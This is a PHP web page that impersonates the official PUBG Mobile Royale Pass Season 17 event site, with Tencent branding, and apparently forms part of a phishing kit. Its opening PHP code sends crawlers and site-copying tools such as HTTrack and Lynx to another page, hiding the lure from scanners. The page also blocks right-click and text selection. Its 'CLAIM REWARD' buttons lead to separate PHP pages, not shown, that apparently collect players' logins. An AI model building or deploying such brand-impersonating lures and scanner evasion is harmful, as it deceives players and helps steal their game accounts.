<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- 页面通用 header 配置 -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="Description" content="ROYALE PASS S17: METRO ROYALE,Unlock the Metro-themed mode coming to Erangel!" />
    <meta name="Keywords" content="PUBG MOBILE,Season 17,Royale Pass 17,ROYALE PASS SEASON 17" />

    <meta property="og:url" content="index.html" />
    <meta property="og:type" content="website">
    <meta property="og:title" content="ROYALE PASS SEASON 17" />
    <meta property="og:description" content="ROYALE PASS S17: METRO ROYALE,Unlock the Metro-themed mode coming to Erangel!" />
    <!-- facebook分享图 -->
    <meta property="og:image" content="images/share.jpg" />
    <!-- twitter分享图 -->
    <meta name="twitter:image" content="images/share.jpg">

    <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/css/swiper.min.css" />
    <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.7.1/jquery.fullPage.min.css" />
    <link rel="stylesheet" href="css/pubg.css" />
    <link rel="stylesheet" href="css/common.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="common/css/all.css" />
    <title>EVENT ROYALE PASS SEASON 17</title>
    <script>
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            setTimeout(function () {
                $('body').addClass('mclass');
            }, 1000);
        }
    </script>
</head>

<body class="en" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<!-- nav -->
<div class="top-nav">
        <div class="top-main c">
                <!-- logo,name -->
                <div class="top-log c">
                        <a href="">
                                <img src="common/images/icon_logo.jpg" width="128" height="128" alt="" />
                        </a>
                        <h1 class="top-tit">
                                PUBG MOBILE
                                <span>OFFICIAL PUBG ON MOBILE</span>
                        </h1>
                </div>
                <!-- line -->
                <div class="top-line"
                        onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
                        <ul>
                                <li>-</li>
                                <li>-</li>
                                <li>-</li>
                        </ul>
                </div>
                <!-- nav-list -->
                <ul class="nav-list">
                        <li class="on">
                                <a href="">HOME</a>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>ROYALE PASS</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/event/royalepass17/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass16'});">ROYALE PASS SEASON 17</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass16/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass16'});">ROYALE PASS SEASON 16</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass15/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass15'});">ROYALE PASS SEASON 15</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass14/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass14'});">ROYALE PASS SEASON 14</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass13/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass13'});">ROYALE PASS SEASON 13</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass12/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass12'});">ROYALE PASS SEASON 12</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass11/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass11'});">ROYALE PASS SEASON 11</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass10/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass10'});">ROYALE PASS SEASON 10</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass9/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass9'});">ROYALE PASS SEASON 9</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass8/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass8'});">ROYALE PASS SEASON 8</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass7/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass7'});">ROYALE PASS SEASON 7</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass6/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass6'});">ROYALE PASS SEASON 6</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass5/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass5'});">ROYALE PASS SEASON 5</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass4/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass4'});">ROYALE PASS SEASON 4</a>
                                        </li>
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>NEWS</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/en-US/news.shtml"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_news'});">NEWS</a>
                                        </li>
                                        <li><a href="https://tencentgames.helpshift.com/a/pubgm/"
                                                        onclick="gtag('event', 'x_click', {'event_category': 'common_inc','event_label': 'nav_faqs'});">FAQs</a>
                                        </li>
                                </ul>
                        </li>
                        <li>
                                <a href="https://www.pubgmobile.com/en-US/media.shtml"
                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_media'});">Media</a>
                        </li>
                        <li>
                                <a href="https://www.pubgmobile.com/esports"
                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_esports'});">ESPORTS</a>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>Events</span>
                                <ul class="event-second event-special">
                                        
                                                        <li><a href="" onclick="">
                                                                        Runic Power</a>
                                                        </li>
                                      
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>Workshop</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/event/pharaohx_suit/"
                                                        onclick="gtag('event','x_jump',{'event_category':'20181108halloweeks','event_label':'nav_pharaohx_suit'});">Pharaoh X-Suit Arrives!</a>
                                        </li>
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><a href="https://www.pubgmobile.com/event/brandassets/"
                                        onclick="gtag('event', 'x_click', {'event_category': 'common_inc','event_label': 'nav_brandassets'});"><span>Brand Assets</span></a>
                        </li>
                        <li class="slide-icon slide-icon-c nav-lang-box">
                                <span>LANGUAGE：
                                        <span class="lang-on"><i class="en"></i><em class="lang_change">EN</em></span>
                                </span>
                                <ul class="event-second special-langlist">
                               
                                        <li class="en"><a href="javascript:;"
                                                        onclick=""><i></i>English</a>
                                        </li>
                                       
                                </ul>
                        </li>
                </ul>
                <div class="top-btn">
                        <a href="http://www.pubgmobile.com/pay/" target="_blank"
                                onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});">PURCHASE</a>
                        <a class="down"
                                href="https://web.gpubgm.com/m/Website/xiaobao/PUBGMOBILE_Global_1.2.0_uawebsite.apk"
                                onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});">DOWNLOAD</a>
                </div>

                <div class="lang-box">
                        <div class="lang-drop slide-list">
                                <p class="lang-on"><i class="en"></i><em class="lang_change">EN</em></p>
                                <em class="lang-arrow"
                                        onclick=""></em>
                        </div>
                        <ul class="lang-list">
                       
                                <li class="en"
                                        onclick="">
                                        <i></i>English
                                </li>
                               
                        </ul>
                </div>
        </div>
</div>
    <div class="wrap" id="full_page">


        <div class="section s7" data-anchor="page1"><img src="images/slogan_en.png" style="position: absolute;
    top: 20%;
    left: -35px;width:270px;">
            <div class="s7_show">
                
                <ul class="s7_pic">
                    <li class="s7_pic1">
                        <a class="s7_go1" onclick="location.href='reward.php'"><p>CLAIM REWARD</p></a>
                    </li>
                    <li class="s7_pic2">
                        <a class="s7_go2" onclick="location.href='nobel.php'"><p>CLAIM REWARD</p></a>
                    </li>
                    <li class="s7_pic3">
                        <a class="s7_go3" onclick="location.href='clock.php'"><p>CLAIM REWARD</p></a>
                    </li>
                </ul>
            </div>
        </div>

        

        <div class="section s8 fp-auto-height" data-anchor="page2">
            <link rel="stylesheet" href="../../../common/css/footer.css">
<div class="footer">
    <div class="foot_ct">
        <p class="foot_icon">
            <a class="foot_icon1" target="_blank">Facebook</a>
            <a class="foot_icon2" target="_blank">Twitter</a>
            <a class="foot_icon3" target="_blank">Youtube</a>
            <a class="foot_icon4" target="_blank">Instagram</a>
            <a class="foot_icon5" target="_blank">VK</a>
        </p>
        <p class="foot_ship">Partnership Inquiry: pubgmobile_business@tencent.com</p>
        <div class="foot_copy clearfix">
            <p class="copy_left">
                <img src="../../../common/images/foot_logo1.png" width="62" height="40" alt="">
                <img src="../../../common/images/foot_logo2.png" width="94" height="40" alt="">
                <img src="../../../common/images/foot_logo3.png" width="165" height="40" alt="">
            </p>
            <div class="copy_right">
                <p>ⓒ 2017 KRAFTON, Inc. All rights reserved.</p>
                <p>ⓒ 2018-2021 Tencent. All rights reserved.</p>
                <p><a onclick="gtag('event', 'x_jump', {'event_category': 
                 'website','event_label': 'pc_footer_terms'});" href="https://www.pubgmobile.com/privacy.html">Privacy Policy </a>|
                    <a onclick="gtag('event', 'x_jump', {'event_category': 
                  'website','event_label': 'pc_footer_privacy'});" href="https://www.pubgmobile.com/terms.html"> Tencent Games User Agreement</a>
                </p>

            </div>
        </div>
    </div>
</div>

        </div>
    </div>
    <ul id="menu">
        <li data-menuanchor="page1" onclick="gtag('event','x_click',{'event_category':'royalepass17','event_label':'menu_btn2'});"
            class="active"><a href="#page1">01</a>
        </li>
        <li data-menuanchor="page2" onclick="gtag('event','x_click',{'event_category':'royalepass17','event_label':'menu_btn2'});"><a
                href="#page2">02</a>
        </li>
    </ul>
    <!-- logo -->
    <img src="images/logo.png" alt="logo" class="img-logo">
    <!-- next page -->
    <div class="img-next-page"></div>
    <!-- pop-->
    <div class="b-bg" style="display: none;">
        <!-- pop-video -->
        <div class="pop-vid pop-con" style="display: none;">
            <a href="javascript:pop.hidevideopop();" class="pop-close"
                onclick="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'pop_close'});">&times;</a>
            <div class="pop-loading"><span>loading...</span></div>
            <div class="pop-player" id="pop-player"></div>
        </div>
        <!-- pop-share -->
        <div class="pop-share" style="display: none;">
            <a href="javascript:pop.hidepop();" class="pop-close"
                onclick="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'pop_close'});">×</a>
            <div class="share-wrap">
                <a href="javascript:;" class="facebook-share-btn"
                    ontouchstart="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'm_share_facebook'});">
                    <img src="images/facebook.png" alt="">
                    <p>FACEBOOK</p>
                </a>
                <a href="javascript:;" class="twitter-share-btn"
                    ontouchstart="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'm_share_twitter'});">
                    <img src="images/twitter.png" alt="">
                    <p>TWITTER</p>
                </a>
            </div>
        </div>
    </div>
    <script src="cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/js/swiper.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.7.1/jquery.fullPage.min.js"></script>
    <script src="js/common.js"></script>
    <script src="js/index.js"></script>
    
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117352746-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-117352746-1');
    </script>



    <script>
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            $("body").addClass("mobile");
        }

        var swiper4 = new Swiper('.swiper-container-s4', {
          slidesPerView: 3,
          spaceBetween: 30,
          centeredSlides: true,
          loop: true,
          autoplay: {
            delay: 2500,
            disableOnInteraction: false,
          },
        });

        function clickbtn(num){
            $('.b-bg').show();
            $('.pop-vid,.pop-share').hide();
            $('.pop-pic').show();
            var index = num;
            $(".poppic").eq(index).addClass('on').siblings().removeClass('on');
        };
    </script>
</body>


</html>